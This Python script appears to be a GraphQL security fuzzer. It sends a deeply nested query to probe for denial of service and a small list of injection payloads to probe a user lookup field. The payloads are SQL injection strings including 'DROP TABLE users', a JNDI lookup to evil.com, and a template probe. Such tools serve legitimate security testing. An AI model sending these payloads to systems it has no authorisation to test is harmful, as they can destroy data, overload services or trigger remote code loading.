#!/usr/bin/env python3
"""GraphQL Fuzzer

Fuzzes GraphQL queries for DoS, injection, and other vulnerabilities.
"""

import requests
import time
from typing import Dict, Any, List, Optional


def test_query_complexity_dos(endpoint: str, headers: Optional[Dict] = None) -> Dict[str, Any]:
    """Test for query complexity DoS
    
    Args:
        endpoint: GraphQL endpoint URL
        headers: Optional headers
        
    Returns:
        Dict with test results
    """
    result = {
        "test": "query_complexity_dos",
        "vulnerable": False,
        "evidence": None
    }
    
    # Generate deeply nested query
    nested_query = "query {"
    for i in range(100):
        nested_query += f"field{i} {{ "
    nested_query += "value" + "}" * 100
    
    try:
        start_time = time.time()
        resp = requests.post(
            endpoint,
            json={"query": nested_query},
            headers=headers or {},
            timeout=30
        )
        elapsed = time.time() - start_time
        
        # If query takes too long or causes error, might be DoS
        if elapsed > 10 or resp.status_code >= 500:
            result["vulnerable"] = True
            result["evidence"] = {
                "response_time": elapsed,
                "status_code": resp.status_code,
                "note": "Complex query caused performance issues"
            }
    except requests.exceptions.Timeout:
        result["vulnerable"] = True
        result["evidence"] = {"note": "Query timeout - potential DoS"}
    except Exception as e:
        result["error"] = str(e)
    
    return result


def test_nested_query_injection(endpoint: str, schema: Optional[Dict] = None, headers: Optional[Dict] = None) -> Dict[str, Any]:
    """Test for nested query injection
    
    Args:
        endpoint: GraphQL endpoint URL
        schema: Optional schema for targeted testing
        headers: Optional headers
        
    Returns:
        Dict with test results
    """
    result = {
        "test": "nested_query_injection",
        "vulnerable": False,
        "evidence": None
    }
    
    # Test injection payloads
    injection_payloads = [
        "' OR '1'='1",
        "'; DROP TABLE users; --",
        "${jndi:ldap://evil.com/a}",
        "{{7*7}}",
    ]
    
    # Simple query with injection attempt
    base_query = "query { user(id: \"PAYLOAD\") { name } }"
    
    for payload in injection_payloads:
        test_query = base_query.replace("PAYLOAD", payload)
        try:
            resp = requests.post(
                endpoint,
                json={"query": test_query},
                headers=headers or {},
                timeout=10
            )
            
            # Check for error messages that reveal injection
            if "sql" in resp.text.lower() or "syntax error" in resp.text.lower():
                result["vulnerable"] = True
                result["evidence"] = {
                    "payload": payload,
                    "response": resp.text[:500]
                }
                break
        except Exception:
            continue
    
    return result


def fuzz_graphql(endpoint: str, schema: Optional[Dict] = None, headers: Optional[Dict] = None) -> Dict[str, Any]:
    """Fuzz GraphQL endpoint
    
    Args:
        endpoint: GraphQL endpoint URL
        schema: Optional schema for targeted fuzzing
        headers: Optional headers
        
    Returns:
        Dict with fuzzing results
    """
    results = {
        "vulnerable": False,
        "tests_run": 0,
        "findings": []
    }
    
    # Test query complexity DoS
    dos_result = test_query_complexity_dos(endpoint, headers)
    results["tests_run"] += 1
    if dos_result["vulnerable"]:
        results["vulnerable"] = True
        results["findings"].append(dos_result)
    
    # Test nested query injection
    injection_result = test_nested_query_injection(endpoint, schema, headers)
    results["tests_run"] += 1
    if injection_result["vulnerable"]:
        results["vulnerable"] = True
        results["findings"].append(injection_result)
    
    return results

